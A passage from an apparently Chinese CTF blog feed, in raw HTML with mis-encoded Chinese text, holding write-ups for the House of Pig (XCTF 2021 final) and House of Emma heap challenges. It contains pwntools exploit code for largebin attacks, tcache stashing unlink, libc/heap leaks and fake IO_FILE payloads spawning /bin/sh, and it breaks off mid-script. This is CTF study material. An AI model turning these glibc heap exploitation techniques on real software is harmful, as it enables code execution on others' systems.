class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;14 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;9 largebin3</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;15 protect</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin3 1-&gt;16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack1</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(free_hook + <span class="number">0x8</span>-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin1 1-&gt;17</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># memsetgot-0x8 -&gt; 2-&gt;9   3-&gt;2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fix largebin&amp;attck2</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(iolistall-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin2 1-&gt;18 iolistall-&gt; 2-&gt;7</span></span><br><span class="line"><span class="comment">#fix largebin</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x13da0</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache smashing unlink</span></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>)) <span class="comment">#2-9 calloced</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x40</span>) + p64(heap_base+<span class="number">0x12ce0</span>) + p64(free_hook-<span class="number">0x10</span>)+cyclic(<span class="number">0x110</span>)</span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))   <span class="comment">#3-&gt;4</span></span><br><span class="line"><span class="comment">#gift!</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;01dwang&#x27;s Gift:\n&quot;</span>)</span><br><span class="line"><span class="comment">#fake IOFILE</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="‰º™ÈÄ†IOFILE"><a href="#‰º™ÈÄ†IOFILE" class="headerlink" title="‰º™ÈÄ†IOFILE"></a>‰º™ÈÄ†IOFILE</h2><h3 id="Êîπ-free-hookÂÅöÊ≥ï"><a href="#Êîπ-free-hookÂÅöÊ≥ï" class="headerlink" title="Êîπ__free_hookÂÅöÊ≥ï"></a>Êîπ__free_hookÂÅöÊ≥ï</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">old_blen = _IO_blen (fp) = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</span><br><span class="line">new_size = <span class="number">2</span> * old_blen + <span class="number">100</span></span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size)</span><br><span class="line"></span><br><span class="line">old_buf = fp-&gt;_IO_buf_base</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen)</span><br></pre></td></tr></table></figure><p>Ê≠§Êó∂<code>_IO_list_all</code>ÊåáÈíàÂ∑≤ÁªèÊåáÂêë‰∫Ügift chunk,Ëøô‰∏™chunkÁöÑÂÜÖÂÆπÂÆåÂÖ®ÊòØÂèØÊéßÁöÑ</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230724133629983.png" alt="image-20230724133629983"></p><p>Ê≥®ÊÑèÂâçÈù¢tcache stashing unlinkÊîπÁöÑ‰ΩçÁΩÆÔºåÂèØËÉΩÈúÄË¶ÅÂú®__free_hookÁöÑÂú∞ÂùÄÂ§ÑÂä†Âáè0x8ÔºåÂõ†‰∏∫tcacheÁî≥ËØ∑‰ºöÊ£ÄÊü•ÂçÅÂÖ≠Â≠óËäÇÂØπÈΩê</p><p>Âõ†‰∏∫ÊàëÊ≤°Áî®ÂéüÈ¢òÁöÑglibc,ËøôÈáåÊàëÂØπÈΩê‰πãÂêéÔºå0xe8Â§ßÂ∞èÁöÑÂ†ÜÂùó‰∏çÂ§üÂÜô‰∫ÜÔºåÊåâÁÖßÂá∫È¢ò‰∫∫ÁöÑÊÄùË∑ØÂ∫îËØ•ÊòØÂàöÂ•ΩÂ§üÂÜôÁöÑ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_addr = heap_base+<span class="number">0x13da0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#write_ptr</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#write_end # fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>)<span class="comment">#buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>+<span class="number">0x1e</span>) <span class="comment">#buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x2166c0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x50d60</span>)</span><br></pre></td></tr></table></figure><h3 id="Êîπmemset-gotÂÅöÊ≥ï"><a href="#Êîπmemset-gotÂÅöÊ≥ï" class="headerlink" title="Êîπmemset gotÂÅöÊ≥ï"></a>Êîπmemset gotÂÅöÊ≥ï</h3><p>Áî±‰∫élibcÊòØpartial RELROÔºågotË°®ÂèØÂÜô</p><p>Âõ†Ê≠§ÂèØ‰ª•ÊäämemsetÁöÑgotÂΩì‰Ωú‰∏Ä‰∏™__free_hook</p><p>Ê≥®ÊÑèËøôÈáåÂÅötcache stashing unlinkÊó∂‰∏çËÉΩÁõ¥Êé•Ë¶ÜÁõñmemsetÁöÑgotË°®ÔºåËøôÊòØÂõ†‰∏∫calloc‰∏≠‰ºöË∞ÉÁî®memset,Â¶ÇÊûúËøôÊó∂ÁöÑgotÂ∑≤ÁªèËøõÂÖ•tcache,Âàô‰ºöÂèòÊàêÂä†ÂØÜÂêéÁöÑfdÔºåripËøêË°åÂà∞ËøôÈáåÊó∂‰ºöÊä•Èîô</p><p>Âõ†ËÄåÊ≠£Á°ÆÁöÑÂÅöÊ≥ïÂ∫îËØ•ÊòØÈ¢ÑÁïô‰∏ÄÂÆöÁöÑÁ©∫Èó¥ÔºåÊú¨È¢òÈôêÂà∂ËæÉÂ§ßÔºåÊïÖ‰∏çÂÅöÊºîÁ§∫Ôºå‰ªÖÊèêÂá∫ÊÄùË∑Ø</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Èò¥Èó¥Â†ÜÈ£éÊ∞¥&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;ÈÄÜÂêë&quot;&gt;&lt;a href=&quot;#ÈÄÜÂêë&quot; class=&quot;headerlink&quot; title=&quot;ÈÄÜÂêë&quot;&gt;&lt;/a&gt;ÈÄÜÂêë&lt;/h2&gt;&lt;h3 id=&quot;‰øÆÂ§çswitch&quot;&gt;&lt;a href=&quot;#‰øÆÂ§çswi</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>House of emma 21ÊπñÊπòÊùØÂ§çÁé∞</title>
    <link href="http://deepunk.icu/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
    <id>http://deepunk.icu/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-27T03:12:57.000Z</published>
    <updated>2023-12-14T15:12:06.895Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ËÆ≤Ê∞¥ËØæÔºåÊÅ∞Â§ßÁ±≥</p></blockquote><p>Ê≤ôÁÆ±ÂºÄÂêØÔºåËÄÉËôëorw</p><p>‰øùÊä§ÂÖ®ÂºÄ</p><h2 id="VMÂàÜÊûê"><a href="#VMÂàÜÊûê" class="headerlink" title="VMÂàÜÊûê"></a>VMÂàÜÊûê</h2><p>Âæ™ÁéØËæìÂÖ•ÔºåÊØèÊ¨°ËØªÊúÄÂ§ö0x500ÔºåÊØèÊ¨°Âæ™ÁéØÂàÜÈÖçÈáäÊîæ0x2000Á©∫Èó¥</p><p>Ê≥®ÊÑèËøôÈáåÊØèÊ¨°Âæ™ÁéØÊó∂ÁöÑmalloc,‰ºöÂΩ±ÂìçÂêéÈù¢ÁöÑÂ†ÜÈ£éÊ∞¥</p><h3 id="ÂÖ•Âè£ÂáΩÊï∞ÂàÜÊûê"><a href="#ÂÖ•Âè£ÂáΩÊï∞ÂàÜÊûê" class="headerlink" title="ÂÖ•Âè£ÂáΩÊï∞ÂàÜÊûê"></a>ÂÖ•Âè£ÂáΩÊï∞ÂàÜÊûê</h3><p><code>sub_1288</code>Â§ÑÊó†Ê≥ïËØÜÂà´</p><p>undefineÂêéÔºåÁî±gdbÂä®Ë∞ÉÁü•ÂÖ•Âè£Âú®0x1289Â§ÑÔºå‰øÆÂ§ç‰∏∫ÂáΩÊï∞</p><p>Â∞ÜËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ÊåáÈíàÂ≠òÂú®<code>[rbp-18h]</code>Â§Ñ</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720151519060.png" alt="image-20230720151519060"></p><p>ÈöèÂêéÂèñÁ¨¨‰∏Ä‰∏™byteÔºå‰∏éËøêÁÆó0FhÔºåËøõË°å‰∏Ä‰∏™Ê≤°‰ªÄ‰πàÁî®ÁöÑÊ£ÄÊü•ÔºåÂÜçÂ∞ÜËØ•ÂÄº*4ÊîæÂÖ•<code>rdx</code>Ôºå‰∏é‰∏Ä‰∏™È¶ñÂú∞ÂùÄÁõ∏Âä†ÊîæÂÖ•<code>eax</code>ÔºåÁ¨¶Âè∑ÊãìÂ±ï‰∏∫<code>rax</code>ÔºàÂõ†‰∏∫ÊòØË¥üÊï∞ÔºâÔºåÂÜç‰∏éËØ•È¶ñÂú∞ÂùÄÁõ∏Âä†Ôºà<code>rax</code>‰∏∫Ë°•Á†ÅÔºåÂÆûÈôÖ‰∏∫Áõ∏ÂáèÔºâÔºåÂÖ∂‰∏≠ÁÆóË¥üÊï∞ËÆ°ÁÆóÂºè‰∏∫<code>hex((~0xfffffffffffff3a1&amp;0xffffffffffffffff)+0x1)</code>ÔºåÈöèÂêéË∑≥ËΩ¨Âà∞ËØ•‰ΩçÁΩÆ</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720152303704.png" alt="image-20230720152303704"></p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th></tr></thead><tbody><tr><td>1488h</td><td>13ddh</td><td>1404h</td><td>1428h</td><td>144ch</td><td>1481h</td><td>12dah</td><td>130dh</td><td>13abh</td><td>1342h</td></tr><tr><td>fail</td><td>add</td><td>delet</td><td>show</td><td>edit</td><td>leave&amp;ret</td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230721133000180.png" alt="image-20230721133000180"></p><p>ËøûÊåâd‰øÆÂ§çË∑≥ËΩ¨Ë°®ÔºåËßÇÂØüË°•Á†ÅÂèØÁü•‰∏∫4Â≠óËäÇ‰∏ÄÁªÑ</p><p>ÂÖ∂ÂÆûÂèØ‰ª•Áî®idaÁöÑedit-&gt;other-&gt;specify switch idiomÂäüËÉΩ‰øÆÂ§ç‰∏∫switch</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174743516-1689673665848-1.png" alt="image-20230718174743516"></li><li>+4&amp;jump to start</li></ul><h3 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h3><ul><li><p>index 2nd byte</p></li><li><p>uaf</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174950029.png" alt="image-20230718174950029"></p></li><li><p>+2</p></li></ul><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><ul><li><p>index 2nd byte</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718175134076.png" alt="image-20230718175134076"></p></li><li><p>+2</p></li></ul><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li>content 2nd dword, size</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230719093944933.png" alt="image-20230719093944933"></li></ul><h3 id="Âà©Áî®ÊÄùË∑Ø"><a href="#Âà©Áî®ÊÄùË∑Ø" class="headerlink" title="Âà©Áî®ÊÄùË∑Ø"></a>Âà©Áî®ÊÄùË∑Ø</h3><p>Â≠òÂú®UAFÔºåÂèØÂ§öÊ¨°ËøõË°ålargbin attack</p><p>Êó†Ê≥ïÊîπÂÜô‰∏∫‰ªªÊÑèÂú∞ÂùÄÔºåÊó†Ê≥ïÁõ¥Êé•house of kiwiÔºåËÄÉËôëhouse of emma</p><ul><li><p>Ê≥ÑÈú≤libc„ÄÅheapÂü∫ÂùÄ</p></li><li><p>‰∏§Ê¨°largbin attackÊîπÂÜô<code>stderr</code>Âíå<code>__pointer_chk_guard</code></p></li><li><p>ÂêàÁêÜ‰º™ÈÄ†stderr‰∏éIOÈìæ</p></li><li><p>Ëß¶Âèë<code>__malloc_assert</code></p></li></ul><h2 id="Â†ÜÂ∏ÉÂ±Ä‰∏élargbin-attack"><a href="#Â†ÜÂ∏ÉÂ±Ä‰∏élargbin-attack" class="headerlink" title="Â†ÜÂ∏ÉÂ±Ä‰∏élargbin attack"></a>Â†ÜÂ∏ÉÂ±Ä‰∏élargbin attack</h2><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#Ëé∑ÂèñlibcÂü∫ÂùÄ</span></span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + <span class="number">0x3c0740</span> + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br></pre></td></tr></table></figure><p>freeÊéâ‰ªªÊÑè‰∏Ä‰∏™unsorted binÂèØËé∑ÂèñlibcÂü∫ÂùÄ</p><blockquote><p>ÈóÆÈ¢òÔºöËøôÈáåÁöÑchunk 0‰∏∫‰ªÄ‰πàËÉΩ‰øùÊåÅÂú®unsorted bin‰∏≠ÔºåËÄåÊ≤°ÊúâÂú®Âæ™ÁéØÂºÄÂßãmalloc0x2000Êó∂ÊîæÂÖ•large binÔºü</p><p>Âõ†‰∏∫chunk 0Âíå0x2000Á¥ßÈÇªÔºåÊØèÊ¨°ÂÆåÊàêÂæ™ÁéØÈÉΩ‰ºöËß¶ÂèëÂêàÂπ∂ÔºåÂπ∂Âú®ÂàÜÈÖçÊó∂Ë¢´Âàá‰∏ãÊù•</p></blockquote><p>ÊûÑÈÄ†0&lt;2ÔºåfreeÊéâÂêéÁî≥ËØ∑‰∏ÄÂùóËæÉÂ∞èÁöÑchunkÔºåÂ∞Ü2ÊîæÂÖ•largebin‰ª•Ëé∑ÂèñheapÂü∫ÂùÄ</p><p>Ê≥®ÊÑèËæìÂá∫Â≠òÂú®Êà™Êñ≠ÔºåÂèØ‰ª•ÂÖàÊää2ÁöÑfd,bkÈÉ®ÂàÜÂ°´Êª°Ôºå‰∫ãÂêéËÆ∞ÂæóË¶Å‰øÆÂ§ç</p><p>Ê≥®ÊÑèlargbinÂ§ßÂ∞è0x440~0x480‰∏∫‰∏Ä‰∏™ËåÉÂõ¥Ôºå‰∏∫ÂêéÁª≠largebin attackËµ∑ËßÅÔºåÂ∫îÊ≥®ÊÑèÈ¢ÑÁïôÂ§ßÂ∞è</p><h3 id="largebin-attack-2"><a href="#largebin-attack-2" class="headerlink" title="largebin attack*2"></a>largebin attack*2</h3><p>largebin attackÁöÑÂà©Áî®ÊñπÂºèÔºö</p><ol><li>Â∞Ü‰∏Ä‰∏™ËæÉÂ§ßÁöÑ„ÄÅlargebin‰∏≠ÁöÑchunkÁöÑbk_nextsizeË¶ÜÁõñ‰∏∫[target-0x20]</li><li>Â∞Ü‰∏Ä‰∏™ËæÉÂ∞èÁöÑchunkÊîæÂÖ•<strong>Âêå‰∏Ä‰∏™</strong>largebinÔºåËß¶Âèëunlink</li><li>Ê≠§Êó∂[target]ÁöÑÂÜÖÂÆπË¢´‰øÆÊîπ‰∏∫ËæÉÂ∞èchunkÁöÑÂú∞ÂùÄ</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)<span class="comment">#ÊûÑÈÄ†ÁöÑÂêåÊó∂È°∫‰æø‰øÆÂ§ç</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span 